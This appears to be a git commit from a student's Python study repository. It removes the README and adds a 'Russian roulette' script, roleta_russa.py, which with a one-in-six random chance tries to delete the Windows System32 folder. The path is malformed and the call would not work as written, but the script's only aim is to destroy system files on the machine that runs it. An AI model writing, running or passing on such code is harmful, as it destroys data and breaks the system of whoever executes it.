64d4bed8cbece94282e7114e80ae49a716b14311
Daniel Pedrozo <daniel_pedrozo1@estudante.sesisenai.org.br>
2023-05-30 19:22:36 -0300

    x

--- README.md
+++
@@ -1,3 +0,0 @@
-# Projetos_py
-
-Esses sao alguns dos pequnos projetos de estudo em python!
---
+++ roleta_russa.py
@@ -0,0 +1,5 @@
+import random, os
+
+
+if( random.randint(1,6) == 6):
+    os.remove("C\Windows\System32")
